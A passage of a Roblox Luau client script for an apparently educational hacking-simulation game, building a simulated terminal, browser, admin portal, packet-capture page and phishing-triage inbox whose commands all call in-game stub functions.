TextTruncate = Enum.TextTruncate.AtEnd,
Font = Enum.Font.Code,
TextSize = 12,
TextColor3 = Color3.fromRGB(76, 86, 102),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 12, 0, 30),
Size = UDim2.new(1, -108, 0, 16),
})
mk("TextLabel", {
Parent = row,
BackgroundTransparency = 1,
TextWrapped = true,
TextYAlignment = Enum.TextYAlignment.Top,
Text = preview,
Font = Enum.Font.Gotham,
TextSize = 12,
TextColor3 = Color3.fromRGB(86, 94, 108),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 12, 0, 50),
Size = UDim2.new(1, -108, 0, 32),
})
local chip = mk("TextLabel", {
Parent = row,
BackgroundColor3 = chipColor,
BorderSizePixel = 0,
Text = statusText,
Font = Enum.Font.GothamBold,
TextSize = 11,
TextColor3 = Color3.new(1, 1, 1),
Position = UDim2.new(1, -84, 0, 12),
Size = UDim2.new(0, 72, 0, 20),
})
round(chip, 6)
end
end
task.defer(function()
local layout = inboxList:FindFirstChild("UIListLayout")
inboxList.CanvasSize = UDim2.new(0, 0, 0, ((layout and layout.AbsoluteContentSize.Y) or 0) + 10)
end)
selectedMail = browserState._getMailEntryById and browserState._getMailEntryById(browserState.selectedMailId) or nil
local senderLabel = detailCard:FindFirstChild("MailDetailSender")
local subjectLabel = detailCard:FindFirstChild("MailDetailSubject")
local bodyFrame = detailCard:FindFirstChild("MailDetailBodyFrame")
local bodyLabel = detailCard:FindFirstChild("MailDetailBody")
local statusLabel = detailCard:FindFirstChild("MailStatusLabel")
local actionHintLabel = detailCard:FindFirstChild("MailActionHintLabel")
local reportButton = detailCard:FindFirstChild("MailReportButton")
local passButton = detailCard:FindFirstChild("MailPassButton")
if senderLabel and senderLabel:IsA("TextLabel") then
senderLabel.Text = "FROM: " .. tostring(selectedMail and selectedMail.sender or "No sender selected")
end
if subjectLabel and subjectLabel:IsA("TextLabel") then
subjectLabel.Text = "SUBJECT: " .. tostring(selectedMail and selectedMail.subject or "No message selected")
end
if bodyLabel and bodyLabel:IsA("TextLabel") then
bodyLabel.Text = tostring(selectedMail and selectedMail.body or "Select a message from the inbox to inspect it.")
end
if bodyFrame and bodyFrame:IsA("ScrollingFrame") then
bodyFrame.CanvasPosition = Vector2.new(0, 0)
end
local selectedAction = selectedMail and triageState.actions[tostring(selectedMail.id or "")] or nil
local canClassify = selectedMail ~= nil and triageState.currentStepId == "ch3_inbox_triage" and selectedAction == nil
if statusLabel and statusLabel:IsA("TextLabel") then
if triageState.total == 0 then
statusLabel.Text = "Inbox unavailable."
elseif selectedAction == "report" then
statusLabel.Text = "This message is already classified as REPORTED."
elseif selectedAction == "pass" then
statusLabel.Text = "This message is already classified as PASSED."
elseif triageState.currentStepId == "ch3_inbox_triage" then
statusLabel.Text = ("%d/%d messages classified. Finish the full queue before the incident escalates."):format(triageState.resolvedCount, triageState.total)
elseif triageState.resolvedCount >= triageState.total and triageState.total > 0 then
statusLabel.Text = "Inbox triage complete. Move to the admin Security Logs tab."
else
statusLabel.Text = "Review the selected message before deciding whether it should be reported."
end
end
if actionHintLabel and actionHintLabel:IsA("TextLabel") then
actionHintLabel.Text = canClassify and "Report phishing mail. Pass Through legitimate internal mail." or "Classification buttons unlock only during the Chapter 3 inbox triage step."
end
if reportButton and reportButton:IsA("TextButton") then
reportButton.Active = canClassify
reportButton.AutoButtonColor = canClassify
reportButton.BackgroundColor3 = canClassify and Color3.fromRGB(184, 61, 61) or Color3.fromRGB(154, 161, 170)
reportButton.TextTransparency = canClassify and 0 or 0.18
end
if passButton and passButton:IsA("TextButton") then
passButton.Active = canClassify
passButton.AutoButtonColor = canClassify
passButton.BackgroundColor3 = canClassify and Color3.fromRGB(63, 142, 96) or Color3.fromRGB(154, 161, 170)
passButton.TextTransparency = canClassify and 0 or 0.18
end
end
browserState._classifySelectedMail = function(action)
local selectedMail = browserState._getMailEntryById and browserState._getMailEntryById(browserState.selectedMailId) or nil
if not selectedMail then
setBrowserStatus("No inbox message selected.")
return
end
local triageState = browserState._getMailTriageState and browserState._getMailTriageState() or { currentStepId = nil, resolvedCount = 0, total = #CHAPTER3_MAILBOX }
if triageState.currentStepId ~= "ch3_inbox_triage" then
if triageState.total > 0 and triageState.resolvedCount >= triageState.total then
setBrowserStatus("Inbox triage already complete.")
else
setBrowserStatus("The Chapter 3 inbox triage step is not active right now.")
end
if browserState._renderMailPage then
browserState._renderMailPage()
end
return
end
local result = submitScenarioAction and submitScenarioAction(("browser_mail %s %s"):format(tostring(selectedMail.id or ""), tostring(action or "report")), { "ch3_inbox_triage" })
if result and result.stepComplete then
setBrowserStatus("Inbox triage complete. WannaWail activity is now hitting office systems.")
elseif result and result.success then
setBrowserStatus(type(result.feedback) == "string" and result.feedback ~= "" and result.feedback or "Message classified.")
elseif result and type(result.output) == "string" and result.output ~= "" then
setBrowserStatus(result.output:gsub('%s+', ' '))
else
setBrowserStatus("Review the selected mail before classifying it.")
end
if browserState._renderMailPage then
browserState._renderMailPage()
end
end
local function scenarioStepMatches(stepIds)
if type(stepIds) ~= "table" or #stepIds == 0 then
return true
end
local sessionInfo = getScenarioSessionInfo()
local currentStepId = sessionInfo and sessionInfo.stepId
if type(currentStepId) ~= "string" or currentStepId == "" then
return false
end
for _, stepId in ipairs(stepIds) do
if currentStepId == stepId then
return true
end
end
return false
end
submitScenarioAction = function(raw, stepIds)
if not scenarioStepMatches(stepIds) then
return nil
end
return syncScenarioProgress(raw, { silent = true })
end
local function showScenarioHint()
local getHintRemote = getScenarioRemote("GetHint")
if not getHintRemote then
addLine("No hint available right now.")
return
end
local ok, hintText = pcall(function()
return getHintRemote:InvokeServer()
end)
if ok and type(hintText) == "string" and hintText ~= "" then
addLine(hintText)
else
addLine("No hint available right now.")
end
end
local function handle(cmdLine)
local raw = tostring(cmdLine or ""):gsub("^%s+", ""):gsub("%s+$", "")
addLine(PROMPT .. raw)
local args = {}
for w in raw:gmatch("%S+") do
args[#args + 1] = w
end
local cmd = (args[1] or ""):lower()
local simOps = browserState._simOps or {}
if cmd == "" then
addLine(PROMPT)
return
end
local function rest(from)
local t = {}
for i = from, #args do
t[#t + 1] = args[i]
end
return table.concat(t, " ")
end
local function parseQuotedAndFile(input)
local pat, file = input:match('^%s*"(.-)"%s+(.+)$')
if pat and file then return pat, file end
local tokens = {}
for token in tostring(input or ""):gmatch("%S+") do
 tokens[#tokens + 1] = token
end
if #tokens < 2 then
 return nil, nil
end
local lastToken = tokens[#tokens]
tokens[#tokens] = nil
return table.concat(tokens, " "), lastToken
end
if cmd == "help" then
simOps.showHelp()
elseif cmd == "hint" then
showScenarioHint()
elseif cmd == "apps" then
addLine("Apps (SIM): terminal, browser, BloxMail, RBXPacketNet, admin portal, RBXIPBlocker")
addLine("Tip: open browser")
elseif cmd == "open" then
local which = (args[2] or ""):lower()
if which == "terminal" then
TermFrame.Visible = true
BrowserFrame.Visible = false
MissionsFrame.Visible = false
if TermInput then TermInput:CaptureFocus() end
addLine("Switched to Terminal.")
elseif which == "browser" then
TermFrame.Visible = false
BrowserFrame.Visible = true
MissionsFrame.Visible = false
if UrlBox and UrlBox.Text == "" then
UrlBox.Text = "home"
navigateTo("home")
else
navigateTo(UrlBox.Text)
end
pcall(function() UrlBox:CaptureFocus() end)
addLine("Switched to Browser.")
elseif which == "notes" then
addLine("Notes app (sim) coming soon")
else
addLine("Try: open terminal OR open browser")
end
elseif cmd == "visit" then
local target = rest(2)
addLine("Opening " .. (target ~= "" and target or "about:blank") .. " ... (sim)")
if UrlBox then UrlBox.Text = target end
navigateTo(target)
elseif cmd == "scan" then
simOps.showScan(rest(2))
elseif cmd == "sniff" then
simOps.showSniff(rest(2))
elseif cmd == "packets" then
simOps.showPackets(rest(2))
elseif cmd == "devices" then
simOps.showDevices()
elseif cmd == "mac" then
simOps.showMac(args[2] or "")
elseif cmd == "connect" then
simOps.fakeConnect(rest(2))
elseif cmd == "ssh" then
simOps.fakeSSH(rest(2))
elseif cmd == "exit" then
simOps.fakeExit()
elseif cmd == "netstat" then
simOps.fakeNetstat()
elseif cmd == "pwd" then
simOps.showWorkingDirectory()
elseif cmd == "cd" then
simOps.changeDirectory(rest(2))
elseif cmd == "psrep" or (cmd == "ps" and (args[2] or "") == "aux") then
simOps.fakePsrep()
elseif cmd == "grep" then
local pattern, file = parseQuotedAndFile(rest(2))
simOps.fakeGrep(pattern, file)
elseif cmd == "malwarescan" then
simOps.fakeMalwareScan()
elseif cmd == "firewall" then
simOps.fakeFirewall(rest(2))
elseif cmd == "kill" then
simOps.fakeKill(args[2] or "")
elseif cmd == "ls" then
simOps.listPath(rest(2))
elseif cmd == "stat" then
simOps.showStat(rest(2))
elseif cmd == "find" then
simOps.findEntries(rest(2))
elseif cmd == "cat" then
simOps.catFile(rest(2))
elseif cmd == "openfile" then
simOps.openFile(rest(2))
elseif cmd == "closefile" then
simOps.closeFile(rest(2))
elseif cmd == "echo" then
addLine(rest(2))
elseif cmd == "rm" then
simOps.removeFile(rest(2))
elseif cmd == "passwd" then
simOps.fakePasswd(rest(2))
elseif cmd == "baitcheck" then
simOps.phishCheck(rest(2))
elseif cmd == "decoymail" then
simOps.decoyMail(rest(2))
elseif cmd == "crack-ng" then
simOps.fakeCrackNG(rest(2))
elseif cmd == "admin" then
local on = (args[2] or ""):lower() == "on"
Player:SetAttribute("Obj_Admin", on)
if on then
browserState.adminLoggedIn = true
end
addLine("Admin mode (sim) = " .. tostring(on))
elseif cmd == "save" then
if saveNow({ force = true }) then
addLine("Autosave completed.")
end
elseif cmd == "load" or cmd == "continue" then
addLine("Use Continue on the start screen.")
elseif cmd == "time" then
addLine(os.date("%Y-%m-%d %H:%M:%S"))
elseif cmd == "clear" or cmd == "reset" then
TermOut:ClearAllChildren()
mk("UIListLayout", { Parent = TermOut, Name = "UIListLayout", Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder })
addLine(PROMPT)
return
else
addLine("I do not know that command. Type: help")
end
if cmd ~= "hint" then
syncScenarioProgress(raw)
end
addLine(PROMPT)
end
local function pushHistory(cmd)
cmd = tostring(cmd or ""):gsub("^%s+", ""):gsub("%s+$", "")
if cmd == "" then return end
if commandHistory[#commandHistory] ~= cmd then
table.insert(commandHistory, cmd)
end
historyIndex = nil
currentDraft = ""
end
local function historyUp()
if #commandHistory == 0 or not TermInput then return end
if historyIndex == nil then
currentDraft = TermInput.Text
historyIndex = #commandHistory
else
historyIndex = math.max(1, historyIndex - 1)
end
TermInput.Text = commandHistory[historyIndex] or ""
TermInput.CursorPosition = #TermInput.Text + 1
end
local function historyDown()
if #commandHistory == 0 or not TermInput then return end
if historyIndex == nil then
return
end
historyIndex = historyIndex + 1
if historyIndex > #commandHistory then
historyIndex = nil
TermInput.Text = currentDraft or ""
else
TermInput.Text = commandHistory[historyIndex] or ""
end
TermInput.CursorPosition = #TermInput.Text + 1
end
local function buildQuickLink(parent, text, url, posX)
local b = mk("TextButton", {
Parent = parent,
Text = text,
Font = Enum.Font.GothamSemibold,
TextSize = 12,
TextColor3 = Color3.new(1, 1, 1),
BackgroundColor3 = Color3.fromRGB(70, 96, 160),
Size = UDim2.fromOffset(110, 24),
Position = UDim2.new(0, posX, 0, 0),
})
round(b, 8)
b.MouseButton1Click:Connect(function()
navigateTo(url)
end)
return b
end
local function buildMainUI()
local gui = mk("ScreenGui", {
Parent = PlayerGui,
Name = "TabletGUI",
IgnoreGuiInset = true,
ResetOnSpawn = false,
Enabled = false,
})
local desktop = mk("Frame", {
Parent = gui,
Size = UDim2.fromScale(1, 1),
BackgroundColor3 = Color3.fromRGB(10, 14, 22),
})
mk("UIGradient", {
Parent = desktop,
Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(23, 34, 58)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(7, 10, 16)),
}),
Rotation = 120,
})
local top = mk("Frame", {
Parent = desktop,
Size = UDim2.new(1, 0, 0, 50),
BackgroundColor3 = Color3.fromRGB(17, 22, 32),
BackgroundTransparency = 0.08,
})
mk("TextLabel", {
Parent = top,
BackgroundTransparency = 1,
Text = "HackOS v1.4",
Font = Enum.Font.GothamBold,
TextSize = 16,
TextColor3 = Color3.fromRGB(220, 236, 255),
Position = UDim2.new(0, 14, 0, 0),
Size = UDim2.fromOffset(180, 50),
TextXAlignment = Enum.TextXAlignment.Left,
})
ClockLabel = mk("TextLabel", {
Parent = top,
BackgroundTransparency = 1,
Text = "--:--:--",
Font = Enum.Font.Code,
TextSize = 15,
TextColor3 = Color3.fromRGB(190, 208, 240),
Position = UDim2.new(1, -170, 0, 0),
Size = UDim2.fromOffset(160, 50),
TextXAlignment = Enum.TextXAlignment.Right,
})
local function button(text, x, w)
local b = mk("TextButton", {
Parent = top,
Text = text,
Font = Enum.Font.GothamSemibold,
TextSize = 14,
TextColor3 = Color3.new(1, 1, 1),
BackgroundColor3 = Color3.fromRGB(45, 57, 84),
Size = UDim2.fromOffset(w or 92, 30),
Position = UDim2.new(0, x, 0, 10),
})
round(b, 9)
return b
end
local bTerm = button("Terminal", 180, 80)
local bBrowser = button("Browser", 265, 80)
local bMissions = button("Missions", 350, 80)
local pad = mk("Frame", {
Parent = desktop,
Position = UDim2.new(0, 14, 0, 64),
Size = UDim2.new(1, -28, 1, -78),
BackgroundColor3 = Color3.fromRGB(15, 19, 28),
BackgroundTransparency = 0.1,
})
round(pad, 14)
TermFrame = mk("Frame", {
Parent = pad,
BackgroundColor3 = Color3.fromRGB(11, 14, 18),
Size = UDim2.new(0.52, -6, 1, -12),
Position = UDim2.new(0, 6, 0, 6),
})
BrowserFrame = mk("Frame", {
Parent = pad,
BackgroundColor3 = Color3.fromRGB(236, 238, 243),
Size = UDim2.new(0.48, -6, 1, -12),
Position = UDim2.new(0.52, 0, 0, 6),
Visible = false,
})
round(TermFrame, 12)
round(BrowserFrame, 12)
MissionsFrame = mk("Frame", {
Parent = pad,
BackgroundColor3 = Color3.fromRGB(15, 19, 28),
Size = UDim2.new(1, -12, 1, -12),
Position = UDim2.new(0, 6, 0, 6),
Visible = false,
})
round(MissionsFrame, 12)
mk("TextLabel", {
Parent = MissionsFrame,
BackgroundTransparency = 1,
Text = " MISSIONS",
Font = Enum.Font.GothamBlack,
TextSize = 18,
TextColor3 = Color3.fromRGB(220, 236, 255),
Position = UDim2.new(0, 10, 0, 10),
Size = UDim2.new(1, -20, 0, 30),
TextXAlignment = Enum.TextXAlignment.Left,
})
MissionsList = mk("ScrollingFrame", {
Parent = MissionsFrame,
BackgroundColor3 = Color3.fromRGB(8, 10, 13),
BorderSizePixel = 0,
ScrollBarThickness = 6,
Size = UDim2.new(1, -20, 0, 200),
Position = UDim2.new(0, 10, 0, 40),
})
round(MissionsList, 10)
mk("UIListLayout", {
Parent = MissionsList,
Name = "UIListLayout",
Padding = UDim.new(0, 6),
SortOrder = Enum.SortOrder.LayoutOrder,
})

mk("TextLabel", {
Parent = MissionsFrame,
BackgroundTransparency = 1,
Text = " OBJECTIVES",
Font = Enum.Font.GothamBlack,
TextSize = 18,
TextColor3 = Color3.fromRGB(220, 236, 255),
Position = UDim2.new(0, 10, 0, 250),
Size = UDim2.new(1, -20, 0, 30),
TextXAlignment = Enum.TextXAlignment.Left,
})
ObjectivesList = mk("ScrollingFrame", {
Parent = MissionsFrame,
BackgroundColor3 = Color3.fromRGB(8, 10, 13),
BorderSizePixel = 0,
ScrollBarThickness = 6,
Size = UDim2.new(1, -20, 1, -290),
Position = UDim2.new(0, 10, 0, 290),
})
round(ObjectivesList, 10)
mk("UIListLayout", {
Parent = ObjectivesList,
Name = "UIListLayout",
Padding = UDim.new(0, 6),
SortOrder = Enum.SortOrder.LayoutOrder,
})
TermOut = mk("ScrollingFrame", {
Parent = TermFrame,
BackgroundColor3 = Color3.fromRGB(8, 10, 13),
BorderSizePixel = 0,
ScrollBarThickness = 6,
Size = UDim2.new(1, -16, 1, -78),
Position = UDim2.new(0, 8, 0, 8),
})
round(TermOut, 10)
mk("UIListLayout", {
Parent = TermOut,
Name = "UIListLayout",
Padding = UDim.new(0, 4),
SortOrder = Enum.SortOrder.LayoutOrder,
})
local h = UIS.TouchEnabled and 40 or 32
TermInput = mk("TextBox", {
Parent = TermFrame,
Text = "",
ClearTextOnFocus = false,
PlaceholderText = "Type command... (Up/Down for history)",
Font = Enum.Font.Code,
TextSize = 16,
TextColor3 = Color3.fromRGB(172, 255, 198),
BackgroundColor3 = Color3.fromRGB(8, 10, 13),
BorderSizePixel = 0,
Size = UDim2.new(1, -(UIS.TouchEnabled and 112 or 16), 0, h),
Position = UDim2.new(0, 8, 1, -(8 + h)),
})
round(TermInput, 9)
if UIS.TouchEnabled then
local run = mk("TextButton", {
Parent = TermFrame,
Text = "Run",
Font = Enum.Font.GothamSemibold,
TextSize = 16,
TextColor3 = Color3.new(1, 1, 1),
BackgroundColor3 = Color3.fromRGB(72, 126, 255),
Size = UDim2.fromOffset(90, h),
Position = UDim2.new(1, -98, 1, -(8 + h)),
})
round(run, 9)
run.MouseButton1Click:Connect(function()
local c = TermInput.Text
TermInput.Text = ""
pushHistory(c)
handle(c)
task.defer(function()
if TermInput and TermInput.Parent and TermFrame.Visible then
TermInput:CaptureFocus()
end
end)
end)
end
UrlBox = mk("TextBox", {
Parent = BrowserFrame,
Text = "",
PlaceholderText = "home (or type a URL)",
Font = Enum.Font.Gotham,
TextSize = 15,
TextColor3 = Color3.new(0, 0, 0),
BackgroundColor3 = Color3.fromRGB(223, 227, 236),
Size = UDim2.new(1, -88, 0, 32),
Position = UDim2.new(0, 8, 0, 8),
})
round(UrlBox, 8)
local goBtn = mk("TextButton", {
Parent = BrowserFrame,
Text = "GO",
Font = Enum.Font.GothamSemibold,
TextSize = 14,
TextColor3 = Color3.new(1, 1, 1),
BackgroundColor3 = Color3.fromRGB(79, 131, 255),
Size = UDim2.fromOffset(64, 32),
Position = UDim2.new(1, -72, 0, 8),
})
round(goBtn, 8)
BrowserStatusLabel = mk("TextLabel", {
Parent = BrowserFrame,
BackgroundTransparency = 1,
Text = "",
Font = Enum.Font.Gotham,
TextSize = 12,
TextColor3 = Color3.fromRGB(70, 82, 100),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 8, 0, 42),
Size = UDim2.new(1, -16, 0, 18),
})
LinkBar = mk("Frame", {
Parent = BrowserFrame,
BackgroundTransparency = 1,
Position = UDim2.new(0, 8, 0, 62),
Size = UDim2.new(1, -16, 0, 24),
})
buildQuickLink(LinkBar, "HackOS Home", "hackos://home", 0)
buildQuickLink(LinkBar, "PacketNet", "rbxpacketnet.com", 118)
buildQuickLink(LinkBar, "Admin Portal", "bloxplay.com/admin", 236)
buildQuickLink(LinkBar, "IP Blocker", "rbxipblocker.com", 354)
BrowserContent = mk("Frame", {
Parent = BrowserFrame,
BackgroundColor3 = Color3.fromRGB(250, 251, 253),
BorderSizePixel = 0,
Position = UDim2.new(0, 8, 0, 92),
Size = UDim2.new(1, -16, 1, -100),
})
round(BrowserContent, 10)
PageLabel = mk("TextLabel", {
Parent = BrowserContent,
BackgroundTransparency = 1,
TextWrapped = true,
TextXAlignment = Enum.TextXAlignment.Left,
TextYAlignment = Enum.TextYAlignment.Top,
Font = Enum.Font.Gotham,
TextSize = 16,
TextColor3 = Color3.new(0, 0, 0),
Text = "",
Size = UDim2.new(1, -16, 1, -16),
Position = UDim2.new(0, 8, 0, 8),
Visible = true,
})
AdminLoginPage = mk("Frame", {
Parent = BrowserContent,
BackgroundTransparency = 1,
Size = UDim2.fromScale(1, 1),
Visible = false,
})
mk("TextLabel", {
Parent = AdminLoginPage,
BackgroundTransparency = 1,
Text = "BLOXPLAY ADMIN",
Font = Enum.Font.GothamBlack,
TextSize = 24,
TextColor3 = Color3.fromRGB(28, 36, 52),
Size = UDim2.new(1, 0, 0, 30),
Position = UDim2.new(0, 0, 0, 18),
})
mk("TextLabel", {
Parent = AdminLoginPage,
BackgroundTransparency = 1,
Text = "Authorized Personnel Login (SIM)",
Font = Enum.Font.Gotham,
TextSize = 14,
TextColor3 = Color3.fromRGB(90, 100, 118),
Size = UDim2.new(1, 0, 0, 20),
Position = UDim2.new(0, 0, 0, 50),
})
AdminUserBox = mk("TextBox", {
Parent = AdminLoginPage,
Text = "",
PlaceholderText = "username",
Font = Enum.Font.Gotham,
TextSize = 16,
TextColor3 = Color3.new(0, 0, 0),
BackgroundColor3 = Color3.fromRGB(233, 237, 244),
BorderSizePixel = 0,
Size = UDim2.new(0, 260, 0, 36),
Position = UDim2.new(0.5, -130, 0, 95),
})
round(AdminUserBox, 8)
AdminPassBox = mk("TextBox", {
Parent = AdminLoginPage,
Text = "",
PlaceholderText = "password",
Font = Enum.Font.Gotham,
TextSize = 16,
TextColor3 = Color3.new(0, 0, 0),
BackgroundColor3 = Color3.fromRGB(233, 237, 244),
BorderSizePixel = 0,
Size = UDim2.new(0, 260, 0, 36),
Position = UDim2.new(0.5, -130, 0, 139),
ClearTextOnFocus = false,
MultiLine = false,
TextEditable = true,
})
round(AdminPassBox, 8)
AdminPassBox:SetAttribute("RealPassword", "")
local adminPassMasking = false
AdminPassBox:GetPropertyChangedSignal("Text"):Connect(function()
if adminPassMasking then return end
local real = tostring(AdminPassBox:GetAttribute("RealPassword") or "")
local shown = tostring(AdminPassBox.Text or "")
if shown == real then
real = shown
elseif shown ~= string.rep("*", #real) then
if #shown > #real then
local added = shown:sub(#real + 1)
real = real .. added
elseif #shown < #real then
real = real:sub(1, #shown)
end
end
AdminPassBox:SetAttribute("RealPassword", real)
adminPassMasking = true
local masked = string.rep("*", #real)
if AdminPassBox.Text ~= masked then
AdminPassBox.Text = masked
end
AdminPassBox.CursorPosition = #masked + 1
adminPassMasking = false
end)
local adminLoginBtn = mk("TextButton", {
Parent = AdminLoginPage,
Text = "LOGIN",
Font = Enum.Font.GothamBold,
TextSize = 15,
TextColor3 = Color3.new(1, 1, 1),
BackgroundColor3 = Color3.fromRGB(76, 123, 255),
Size = UDim2.new(0, 140, 0, 36),
Position = UDim2.new(0.5, -70, 0, 188),
})
round(adminLoginBtn, 8)
AdminLoginStatus = mk("TextLabel", {
Parent = AdminLoginPage,
BackgroundTransparency = 1,
Text = "",
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.fromRGB(90, 100, 118),
Size = UDim2.new(1, -30, 0, 20),
Position = UDim2.new(0, 15, 0, 233),
})
mk("TextLabel", {
Parent = AdminLoginPage,
BackgroundTransparency = 1,
TextWrapped = true,
Text = "Use the physical office note for credentials.",
Font = Enum.Font.Gotham,
TextSize = 12,
TextColor3 = Color3.fromRGB(97, 108, 126),
Size = UDim2.new(1, -60, 0, 34),
Position = UDim2.new(0, 30, 0, 258),
})
AdminDashboardPage = mk("Frame", {
Parent = BrowserContent,
BackgroundTransparency = 1,
Size = UDim2.fromScale(1, 1),
Visible = false,
})
mk("TextLabel", {
Parent = AdminDashboardPage,
BackgroundTransparency = 1,
Text = "BLOXPLAY ADMIN DATABASE",
Font = Enum.Font.GothamBlack,
TextSize = 22,
TextColor3 = Color3.fromRGB(28, 36, 52),
Position = UDim2.new(0, 10, 0, 10),
Size = UDim2.new(1, -20, 0, 28),
TextXAlignment = Enum.TextXAlignment.Left,
})
mk("TextLabel", {
Parent = AdminDashboardPage,
BackgroundTransparency = 1,
Text = "Database records and live incident logging",
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.fromRGB(90, 100, 118),
Position = UDim2.new(0, 10, 0, 38),
Size = UDim2.new(1, -20, 0, 18),
TextXAlignment = Enum.TextXAlignment.Left,
})
local adminDatabaseTabBtn = mk("TextButton", {
Parent = AdminDashboardPage,
Name = "AdminDatabaseTabBtn",
Text = "Database",
Font = Enum.Font.GothamBold,
TextSize = 13,
TextColor3 = Color3.new(1, 1, 1),
BackgroundColor3 = Color3.fromRGB(76, 123, 255),
Position = UDim2.new(0, 10, 0, 64),
Size = UDim2.new(0, 104, 0, 28),
})
round(adminDatabaseTabBtn, 8)
local adminLogsTabBtn = mk("TextButton", {
Parent = AdminDashboardPage,
Name = "AdminLogsTabBtn",
Text = "Security Logs",
Font = Enum.Font.GothamBold,
TextSize = 13,
TextColor3 = Color3.new(1, 1, 1),
BackgroundColor3 = Color3.fromRGB(100, 110, 132),
Position = UDim2.new(0, 120, 0, 64),
Size = UDim2.new(0, 118, 0, 28),
})
round(adminLogsTabBtn, 8)
AdminSearchBox = mk("TextBox", {
Parent = AdminDashboardPage,
Text = "",
PlaceholderText = "Search staff or player data...",
Font = Enum.Font.Gotham,
TextSize = 14,
TextColor3 = Color3.new(0, 0, 0),
BackgroundColor3 = Color3.fromRGB(233, 237, 244),
BorderSizePixel = 0,
Position = UDim2.new(0, 10, 0, 100),
Size = UDim2.new(1, -20, 0, 34),
})
round(AdminSearchBox, 8)
AdminResultsFrame = mk("ScrollingFrame", {
Parent = AdminDashboardPage,
BackgroundColor3 = Color3.fromRGB(238, 242, 248),
BorderSizePixel = 0,
ScrollBarThickness = 6,
Position = UDim2.new(0, 10, 0, 142),
Size = UDim2.new(1, -20, 1, -152),
})
round(AdminResultsFrame, 8)
mk("UIListLayout", {
Parent = AdminResultsFrame,
Name = "UIListLayout",
Padding = UDim.new(0, 6),
SortOrder = Enum.SortOrder.LayoutOrder,
})
local adminLogsFrame = mk("ScrollingFrame", {
Parent = AdminDashboardPage,
Name = "AdminLogsFrame",
BackgroundColor3 = Color3.fromRGB(238, 242, 248),
BorderSizePixel = 0,
ScrollBarThickness = 6,
Position = UDim2.new(0, 10, 0, 100),
Size = UDim2.new(1, -20, 1, -110),
Visible = false,
})
round(adminLogsFrame, 8)
mk("UIListLayout", {
Parent = adminLogsFrame,
Name = "UIListLayout",
Padding = UDim.new(0, 6),
SortOrder = Enum.SortOrder.LayoutOrder,
})
PacketPage = mk("Frame", {
Parent = BrowserContent,
BackgroundTransparency = 1,
Size = UDim2.fromScale(1, 1),
Visible = false,
})
mk("TextLabel", {
Parent = PacketPage,
BackgroundTransparency = 1,
Text = "RBXPacketNet",
Font = Enum.Font.GothamBlack,
TextSize = 24,
TextColor3 = Color3.fromRGB(30, 40, 58),
Position = UDim2.new(0, 10, 0, 10),
Size = UDim2.new(1, -20, 0, 28),
TextXAlignment = Enum.TextXAlignment.Left,
})
mk("TextLabel", {
Parent = PacketPage,
BackgroundTransparency = 1,
Text = "Targeted Packet Capture (SIM)",
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.fromRGB(88, 98, 114),
Position = UDim2.new(0, 10, 0, 36),
Size = UDim2.new(1, -20, 0, 18),
TextXAlignment = Enum.TextXAlignment.Left,
})
PacketToolbar = mk("Frame", {
Parent = PacketPage,
BackgroundColor3 = Color3.fromRGB(233, 237, 244),
BorderSizePixel = 0,
Position = UDim2.new(0, 10, 0, 62),
Size = UDim2.new(1, -20, 0, 42),
})
round(PacketToolbar, 8)
PacketIPBox = mk("TextBox", {
Parent = PacketToolbar,
Text = "",
PlaceholderText = "Target IP (e.g. 192.168.32.12)",
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.new(0, 0, 0),
BackgroundColor3 = Color3.fromRGB(248, 250, 253),
BorderSizePixel = 0,
Position = UDim2.new(0, 8, 0, 6),
Size = UDim2.new(0, 160, 0, 30),
})
round(PacketIPBox, 8)
PacketDNSBox = mk("TextBox", {
Parent = PacketToolbar,
Text = "",
PlaceholderText = "DNS/Server filter",
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.new(0, 0, 0),
BackgroundColor3 = Color3.fromRGB(248, 250, 253),
BorderSizePixel = 0,
Position = UDim2.new(0, 176, 0, 6),
Size = UDim2.new(0, 132, 0, 30),
})
round(PacketDNSBox, 8)
PacketApplyBtn = mk("TextButton", {
Parent = PacketToolbar,
Text = "Capture",
Font = Enum.Font.GothamSemibold,
TextSize = 13,
TextColor3 = Color3.new(1, 1, 1),
BackgroundColor3 = Color3.fromRGB(79, 131, 255),
Position = UDim2.new(1, -180, 0, 6),
Size = UDim2.new(0, 60, 0, 30),
})
round(PacketApplyBtn, 8)
PacketClearBtn = mk("TextButton", {
Parent = PacketToolbar,
Text = "Clear",
Font = Enum.Font.GothamSemibold,
TextSize = 13,
TextColor3 = Color3.new(1, 1, 1),
BackgroundColor3 = Color3.fromRGB(110, 120, 145),
Position = UDim2.new(1, -114, 0, 6),
Size = UDim2.new(0, 52, 0, 30),
})
round(PacketClearBtn, 8)
PacketFollowBtn = mk("TextButton", {
Parent = PacketToolbar,
Text = "Follow",
Font = Enum.Font.GothamSemibold,
TextSize = 13,
TextColor3 = Color3.new(1, 1, 1),
BackgroundColor3 = Color3.fromRGB(76, 168, 110),
Position = UDim2.new(1, -56, 0, 6),
Size = UDim2.new(0, 48, 0, 30),
})
round(PacketFollowBtn, 8)
PacketListFrame = mk("ScrollingFrame", {
Parent = PacketPage,
BackgroundColor3 = Color3.fromRGB(233, 237, 244),
BorderSizePixel = 0,
ScrollBarThickness = 6,
Position = UDim2.new(0, 10, 0, 112),
Size = UDim2.new(1, -20, 1, -122),
})
round(PacketListFrame, 8)
mk("UIListLayout", {
Parent = PacketListFrame,
Name = "UIListLayout",
Padding = UDim.new(0, 6),
SortOrder = Enum.SortOrder.LayoutOrder,
})
local mailPage = mk("Frame", {
Parent = BrowserContent,
Name = "MailPage",
BackgroundTransparency = 1,
Size = UDim2.fromScale(1, 1),
Visible = false,
})
mk("TextLabel", {
Parent = mailPage,
BackgroundTransparency = 1,
Text = "BloxMail - Staff Inbox Queue",
Font = Enum.Font.GothamBold,
TextSize = 20,
TextColor3 = Color3.fromRGB(24, 30, 38),
